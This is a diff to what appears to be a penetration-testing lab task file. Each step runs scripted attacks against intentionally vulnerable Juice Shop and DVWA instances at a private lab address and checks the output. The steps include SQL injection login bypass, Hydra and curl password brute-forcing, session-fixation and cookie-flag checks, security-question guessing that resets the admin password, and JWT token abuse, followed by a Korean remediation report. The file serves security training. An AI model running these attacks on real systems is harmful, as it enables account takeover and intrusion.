@@ -23,6 +23,7 @@ steps:
     type: output_contains
     expect: token
     field: stdout
+  target_vm: attacker
   script: 'curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op''\''''--","password":"anything"}'''
   risk_level: medium
 - order: 2
@@ -37,6 +38,7 @@ steps:
     type: output_regex
     expect: host|login|password|hydra
     field: stdout
+  target_vm: attacker
   script: echo -e 'password\nadmin\n123456\nletmein\ntest' > /tmp/dvwa_pass.txt && hydra -l admin -P /tmp/dvwa_pass.txt 10.20.30.80 -s 8080 http-post-form '/login.php:username=^USER^&password=^PASS^&Login=Login:Login
     failed' -t 4 -f 2>/dev/null | tail -5
   risk_level: medium
@@ -52,6 +54,7 @@ steps:
     type: output_regex
     expect: FOUND|FAIL
     field: stdout
+  target_vm: attacker
   script: 'for pw in admin password 123456 letmein; do RESP=$(curl -s -b ''PHPSESSID=test;security=low'' "http://10.20.30.80:8080/vulnerabilities/brute/?username=admin&password=$pw&Login=Login" 2>/dev/null);
     if echo "$RESP" | grep -q ''Welcome''; then echo "FOUND: password=$pw"; break; fi; echo "FAIL: $pw"; done'
   risk_level: medium
@@ -68,6 +71,7 @@ steps:
     type: output_contains
     expect: HttpOnly
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== DVWA Session Cookie Analysis ==='' && COOKIE_HEADER=$(curl -sI -d ''username=admin&password=password&Login=Login'' http://10.20.30.80:8080/login.php | grep -i set-cookie) && echo "Raw:
     $COOKIE_HEADER" && echo $COOKIE_HEADER | grep -qi httponly && echo ''HttpOnly: SET'' || echo ''HttpOnly: MISSING (XSS cookie theft possible)'' && echo $COOKIE_HEADER | grep -qi secure && echo ''Secure:
     SET'' || echo ''Secure: MISSING (cookie sent over HTTP)'' && echo $COOKIE_HEADER | grep -qi samesite && echo ''SameSite: SET'' || echo ''SameSite: MISSING (CSRF possible)'''
@@ -85,6 +89,7 @@ steps:
     type: output_contains
     expect: Session Fixation Test
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Session Fixation Test ==='' && PRE_SESSION=$(curl -sI http://10.20.30.80:8080/login.php | grep -i ''set-cookie'' | grep -o ''PHPSESSID=[^;]*'') && echo "Before login: $PRE_SESSION"
     && POST_SESSION=$(curl -sI -b "$PRE_SESSION" -d ''username=admin&password=password&Login=Login'' http://10.20.30.80:8080/login.php | grep -i ''set-cookie'' | grep -o ''PHPSESSID=[^;]*'') && echo "After
     login: $POST_SESSION" && if [ "$PRE_SESSION" = "$POST_SESSION" ] || [ -z "$POST_SESSION" ]; then echo ''VULNERABLE: Session ID NOT regenerated''; else echo ''SAFE: Session ID regenerated''; fi'
@@ -103,6 +108,7 @@ steps:
     type: output_contains
     expect: Security Questions
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Security Questions ==='' && curl -s http://10.20.30.80:3000/api/SecurityQuestions/ | python3 -c "import sys,json; [print(f''{q[\"id\"]}: {q[\"question\"]}'') for q in json.load(sys.stdin).get(''data'',[])]"
     2>/dev/null && echo ''=== Password Reset Attempts ==='' && for ANS in ''Samuel'' ''Mr. N. Flansen'' ''West-2'' ''Snook''; do echo -n "Answer ''$ANS'': " && curl -s -o /dev/null -w ''%{http_code}'' -X
     POST http://10.20.30.80:3000/rest/user/reset-password -H ''Content-Type: application/json'' -d "{\"email\":\"admin@juice-sh.op\",\"answer\":\"$ANS\",\"new\":\"hacked123\",\"repeat\":\"hacked123\"}"
@@ -120,6 +126,7 @@ steps:
     type: output_contains
     expect: First name
     field: stdout
+  target_vm: attacker
   script: curl -s -c /tmp/dvwa_auth13.txt -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php -L > /dev/null && echo '=== Low Level SQLi ===' && curl -s -b /tmp/dvwa_auth13.txt
     -b 'security=low' "http://10.20.30.80:8080/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit" | grep -o 'First name:[^<]*' | head -3
   risk_level: medium
@@ -136,6 +143,7 @@ steps:
     type: output_contains
     expect: Valid Token
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== No Token ==='' && curl -s http://10.20.30.80:3000/rest/user/whoami | head -c 200 && echo '''' && echo ''=== Valid Token ==='' && TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login
     -H ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"'' | cut -d''"'' -f4) && curl -s http://10.20.30.80:3000/rest/user/whoami -H "Authorization:
     Bearer $TOKEN" | head -c 200 && echo '''' && echo ''=== Tampered Token ==='' && curl -s http://10.20.30.80:3000/rest/user/whoami -H ''Authorization: Bearer INVALID.TOKEN.HERE'' | head -c 200'
@@ -153,6 +161,7 @@ steps:
     type: output_contains
     expect: 인증/세션 관리 취약점 종합 보고서
     field: stdout
+  target_vm: attacker
   script: "cat > /tmp/auth_report.txt << 'EOF'\n=== 인증/세션 관리 취약점 종합 보고서 ===\n대상: JuiceShop + DVWA (10.20.30.80)\n\n[CRITICAL]\n1. SQL Injection 인증 우회 (JuiceShop)\n   방어: Prepared Statement, ORM 사용\n\n[HIGH]\n\
     2. 브루트포스 Rate Limiting 부재\n   방어: 5회 실패시 30초 잠금 + CAPTCHA\n3. 세션 고정(Session Fixation) 취약\n   방어: 로그인시 session_regenerate_id()\n4. 보안 질문 추측 가능\n   방어: MFA 도입, 보안 질문 폐기\n\n[MEDIUM]\n5. 쿠키 보안 속성 미설정\n\
     \   방어: HttpOnly, Secure, SameSite=Strict\n6. 쿠키 기반 보안 레벨 관리\n   방어: 서버 측 세션에서만 관리\n\n[종합 권고]\n- bcrypt/argon2 패스워드 해싱\n- JWT 서버측 알고리즘 고정 + 강력한 서명키\n- MFA(TOTP/WebAuthn) 도입\nEOF\ncat /tmp/auth_report.txt"
